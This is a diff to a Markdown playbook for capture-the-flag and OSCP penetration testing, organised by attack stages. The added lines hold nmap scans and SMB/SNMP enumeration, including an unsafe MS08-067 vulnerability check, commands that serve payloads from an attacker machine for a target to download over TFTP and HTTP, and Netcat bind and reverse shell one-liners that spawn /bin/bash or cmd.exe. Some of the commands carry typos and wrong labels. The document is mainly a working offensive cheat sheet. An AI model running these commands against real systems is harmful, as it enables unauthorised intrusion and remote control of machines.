@@ -21,85 +21,71 @@ Previous Play Icon:
 - [Index and Playsets](#index-and-playsets)
 - [Reconnaissance 1](#reconnaissance-1)
 - [Reconnaissance 2](#reconnaissance-2)
-- [DNS enumeration](#dns-enumeration)
-- [testing for XSS](#testing-for-xss)
-- [In a website form enter](#in-a-website-form-enter)
-  - [Moving Fast and Breaking Things](#moving-fast-and-breaking-things)
-- [make output directory for skipfish](#make-output-directory-for-skipfish)
-- [get sample list](#get-sample-list)
-- [remove line "ro"](#remove-line-%22ro%22)
-- [location of kali linux malicious web shells](#location-of-kali-linux-malicious-web-shells)
-- [Use the following techniques to upload malfiles such as php reverse shells](#use-the-following-techniques-to-upload-malfiles-such-as-php-reverse-shells)
-- [Upload via HTTP](#upload-via-http)
-- [Start a local web server](#start-a-local-web-server)
-- [change directories to webserver](#change-directories-to-webserver)
-- [download files to webserver](#download-files-to-webserver)
-- [download files from your webserver to your target](#download-files-from-your-webserver-to-your-target)
-- [Upload via FTP](#upload-via-ftp)
-- [Upload via TFTP](#upload-via-tftp)
-- [Upload via SMB](#upload-via-smb)
-- [Upload via SSH / SCP](#upload-via-ssh--scp)
-- [Find the last commands run](#find-the-last-commands-run)
-- [Find the Kernel Version](#find-the-kernel-version)
-- [Find versions of executatbles](#find-versions-of-executatbles)
-- [exploit outdated nmap version](#exploit-outdated-nmap-version)
-- [Look at user permissions](#look-at-user-permissions)
-- [Find other Users](#find-other-users)
-- [World Readable / Writable Files](#world-readable--writable-files)
-- [Inspect web traffice](#inspect-web-traffice)
-- [look at cronjobs that runs as root with incorrect permissions](#look-at-cronjobs-that-runs-as-root-with-incorrect-permissions)
-- [Manual sudo to root](#manual-sudo-to-root)
-- [Get OS and Kernel Version, look for public exploits](#get-os-and-kernel-version-look-for-public-exploits)
-- [Check for SUID files in the sytem](#check-for-suid-files-in-the-sytem)
-- [The best script I've found by far](#the-best-script-ive-found-by-far)
-- [Above but as one script](#above-but-as-one-script)
-- [escalate to root](#escalate-to-root)
-- [get system information](#get-system-information)
-- [find network interfaces](#find-network-interfaces)
-- [drop into a shell](#drop-into-a-shell)
-- [Add sudoers](#add-sudoers)
-- [If you've found a flag and calculated size](#if-youve-found-a-flag-and-calculated-size)
-- [locate "hidden" files](#locate-%22hidden%22-files)
-- [Example, fork the template to make your own victory site](#example-fork-the-template-to-make-your-own-victory-site)
-- [Carnage (don't run this on anything you care about, you've been warned)](#carnage-dont-run-this-on-anything-you-care-about-youve-been-warned)
-- [change your mac address](#change-your-mac-address)
-- [arpspoof your address](#arpspoof-your-address)
-- [list processes](#list-processes)
+- [Reconnaissance 3](#reconnaissance-3)
+- [Weaponization](#weaponization)
+- [Delivery](#delivery)
+- [Exploitation](#exploitation)
+- [Reconnaissance 4](#reconnaissance-4)
+- [Command and GitTroll (CG2)](#command-and-gittroll-cg2)
+- [Priviledge Escalation](#priviledge-escalation)
+- [Actions on Objectives](#actions-on-objectives)
+- [Celebration](#celebration)
+- [Non Necessities](#non-necessities)
+- [Documentation](#documentation)
+- [Credit and Resources](#credit-and-resources)
+- [Resources](#resources)
+  - [Videos](#videos)
+  - [Github](#github)
+- [General Unix Commands](#general-unix-commands)
+  - [Netcat](#netcat)
+- [OSCP Specefic Commands](#oscp-specefic-commands)
+- [OSINT and Passive Information Gathering](#osint-and-passive-information-gathering)
 
 
 # Reconnaissance 1 
-Locate and identify the target 
+Locate and identify live targets on the network 
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#reconnaissance-2)  
 
 __Scan Network For Targets__
 ``` bash
+# Use ARP protocol to find machines on the network
 arp-scan -I [interface] -l
-nmap -sn -oG sweep.txt -p [CIDR range of network] | grep "Status Up"
+# Perform a ping sweep for live hosts
+1) nmap -v -sn [CIDR range of network] -oG sweep.txt
+2) grep "Status Up" sweep.txt | cut -d" " -f 2
+# use netdiscover to find live hosts
 netdiscover -i [interface] -p
 nmap -sP [target/CIDR Range]
 ```
 # Reconnaissance 2  
-Gather information on the network
+Conduct network and service enumeration on targets
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#reconnaissance-3)  
 
 __Simple Port Scanning Enumeration__
 ``` bash 
-
+# Quick Nmap Scan
 nmap -T 5 [target]
-nmap -p 1-65535 -sV -sS -T4 [target]
-nmap -sV -sT -O -A -p- [target]
+# Nmap scan for service version and OS fingerprinting 
+nmap -sV -O -A [target]
+# Nmap scan for service version and OS fingerprinting, banner grabbing,  all ports
+nmap -sV -O -A -sT -p- [target]
+# Nmap for UDP ports
+nmap -sU [target]
+# Nmap for all UDP ports {!}Warning, this is slow
 nmap -sU -p- [target]
-nmap -Pn -p- [target]
-nmap -sT -p 161 [target/254] -oG snmp_results.txt 
-(then grep)
-
+# Nmap NSE scripting enginge for nbt service
 nmap -sU --script nbstat.nse -p 137 [target]
+```
+__Automated Port Scanning__  
+Port Scanning can be automated with the following tools  
++ [Sparta](https://tools.kali.org/information-gathering/sparta): Add your targets to the scope and run scans. Sparta will generate port and service enumeration, as well as web service enumeration with Nikto. Pass along services to Brute to attempt brute force attacks  
++ [OpenVas](https://tools.kali.org/vulnerability-analysis/openvas): An open source vulnerability scanner
++ [Nessus](https://www.tenable.com/blog/getting-started-with-nessus-on-kali-linux):
 
-*sparta, add [target] to scope*
-
-nc -nv [target][port]
-nc -nlvp [target][port]
-ncat [host] [port]
+__Port Scanning Scripts__  
+```bash
+# Manually check port with ncat
+nc -nv [target] [port]
 
 # custom little bash script for ping sweeping 
 
@@ -126,9 +112,17 @@ tcpdump [interface]
 tcpdump port [port]
 ```
 
-```
 __Vulnerability Scanning__
 ``` bash
+# Search for public exploits
+searchsploit [any term (service, version, ect)]
+# Vulnerability Scanning with Nmap
+
+#
+
+# Using Nmap NSE scripting engine
+# Scan target for SMB vulns
+nmap [target] --script smb-os-discovery.nse
 nmap -sc [target]
 nmap --script discovery
 nmap -sC vuln
@@ -147,10 +141,34 @@ ike-scan [target]
 
 # Reconnaissance 3 
 Digging deeper into particular services, and running massive vulnerability scans. 
-[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#weaponization) [![Alt text](/images/ctf-back-button.png "Previous Play")](#reconnaissance-2)
+[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#weaponization) [![Alt text](/images/ctf-back-button.png "Previous Play")](#reconnaissance-2)  
+  
+    
 
+For a list of TCP and UDP ports and their common services, visit this [Wikipedia Page](https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers)
 
-__Web Server Enumeration__
+__Port 20 FTP__  
+__Port 21 FTP__  
+```bash
+# check for ftp vuln
+nmap -v -p 21 --script=ftp-anon.nse [target]
+```
+__Port 22 SSH__  
+__Port 23 Telnet__  
+__Port 25 SMTP__  
+```bash
+# interact with SMTP using ncat
+nc -nv [target] 25
+```
+__Port 43 WHOIS__  
+__Port 53 DNS__  
+```bash
+# use nmap to attempt zone transfer
+nmap --script=dns-zone-transfer -p 53 [domain server]
+```
+__Port 67, 68 BOOT,DHCP__  
+__Port 79 Finger__  
+__Port 80 HTTP__  
 ``` bash
 firefox [target]
 firefox [target]/robots.txt
@@ -176,7 +194,53 @@ mkdir skipfish-output
 cp /use/share/skipfish/dictionaries/medium.w1
 # remove line "ro"
 skipfish -W medium -o skipfish-output
+```  
+__Port 88 Kerberos__  
+__Port 101 NIC host name__  
+__Port 102 ISO__  
+__Port 107 RTelnet__  
+__Port 111 ONC RPC__  
+__Port 113 IRC, AUTH__  
+__Port 115 SFTP__  
+__Port 118 SQL__  
+__Port 137 NetBIOS__  
+__Port 139, 445 SMB__  
+```bash
+# use nmap to scan for netbios service
+nmap -v -p 139,445 -oG smb.txt [target]
+# use nmap script for host discvovery
+nmap -v -p 139, 445 --script=smb-os-discovery [target]
+# List nmap smb nse scripts
+ls -l /usr/share/nmap/scripts/smb*
+# check for common smb vuln
+nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 [target]
+# use nbtscan
+nbtscan -r [target]
+# use enum4linux to check for null session
+enum4linux -a [target]
 ```
+__Port 143 IMAP__  
+__Port 161 SNMP__  
+```bash
+# scan for open SNMP port
+nmap -sU --open -p 161 [target] -oG mega-snmp.txt
+# use onesixty one 
+echo public > community
+echo private >> community
+echo manager >> community
+for ip in $(seq 1 254);do echo 10.11.1.$ip;done > ips
+onesixtyone -c community -i ips
+# use snmp walk 
+snmpwalk -c public -v1 [target]
+```
+__Port 443 HTTPS__  
+__Port 445 Active Directory__  
+__Port 464 Kerberos__  
+__Port 513 rlogin__  
+__Port 514 Remote Shell__  
+__Port 530 RPC__  
+__Port 587 SMTP__  
+
 
 __NBT,SMB,SNMP Scan__
 ```bash
@@ -246,8 +310,32 @@ cd /user/share/webshells/
 ```
 
 # Delivery 
-Deliver payload to the target
+Deliver payload to the target, transfer files between target and attack machine.
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#exploitation)
+
+__Transfer Files with FTP__  
+```bash
+# Set up an FTP server in Kali
+root@kali: $ mkdir /tftp
+atftpd --daemon --port 69 /tftp
+cp /file/you/want/to/share.extension /tftp/
+
+target@target: $ tftp -i [attack ip]get [file.extension]
+```
+
+__Set up a Webserver to Share files,exploits__  
+```bash
+# Set up web server in kali
+# run web server
+service apache2 start 
+# navigate to folder 
+cd /var/www/html
+# place files in folder 
+nano file.extension
+cp /path/to/file /name.extension
+# download file from target machine 
+target@target: $wget http://[attack ip]/file.extension
+```
 
 __Upload Maliscous File__
 ```bash
@@ -535,7 +623,51 @@ There are countless resources and people who deserve credit for their contributi
 ps aux
 ps aux | grep [keyword]
 top
+# start ssh service
+systemctl enable ssh
+systemctl start ssh
+service ssh start
+#start web server
+systemctl enable apache2
+service apache2 start
 
+# check if a service is running 
+netstat -antp|grep [service]
+
+# download web page 
+wget http://name.domain.com
+
+# move a file 
+mv filename.extension /path/to/new/place
+
+# reading files
+head [file]
+tail [file]
+nano [file]
+cat [file]
+
+# monitor your network traffic 
+iptables -I INPUT 1 -s [target] -j ACCEPT
+iptables -I OUTPUT 1 -d [target] -j ACCEPT
+iptables -Z
+```
+
+## Netcat 
+```bash
+# connect to a targt port 
+nc -nc [target ip] [port]
+# listen on a port 
+nc -nlvp [port]
+# redirect input to file
+nc -nc [target ip] [port] >  [filename.extension]
+# bind a shell to a port (windows)
+nc -nlvp [port] -e cmd.exe
+# bind a shell to a port (linux)
+nc -nlvp [port] -e /bin/bash
+# send a reverse shell (linux)
+nc -nc [target] [port] -e cmd.exe
+# send a reverse shell (linux)
+nc -nc [target] [port] -e /bin/bash
 ```
 
 # OSCP Specefic Commands 
@@ -545,6 +677,7 @@ locate network-secret.txt
 locate proof.txt
 ```
 
+# OSINT and Passive Information Gathering 
 
 
 
